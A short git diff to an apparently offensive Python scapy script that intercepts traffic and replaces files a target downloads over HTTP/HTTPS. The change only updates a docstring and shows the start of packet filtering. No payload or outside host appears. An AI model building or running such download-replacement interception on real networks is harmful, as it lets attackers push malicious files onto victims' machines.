@@ -14,8 +14,9 @@ def set_load(packet, load):
 
 
 def process_packet(packet):
-    """Modify downloads files on the fly while target uses HTTP.
-    Do not forget to modify line 23 and 34 nad uncomment them afterwards."""
+    """Modify downloads files on the fly while target uses HTTP/HTTPS.
+    Do not forget to choose the port you will be using in line 22/29.
+    Do not forget to modify line 24 and 35 and uncomment them afterwards."""
     scapy_packet = scapy.IP (packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == #CHOOSE PORT HERE: 80 / 10000:
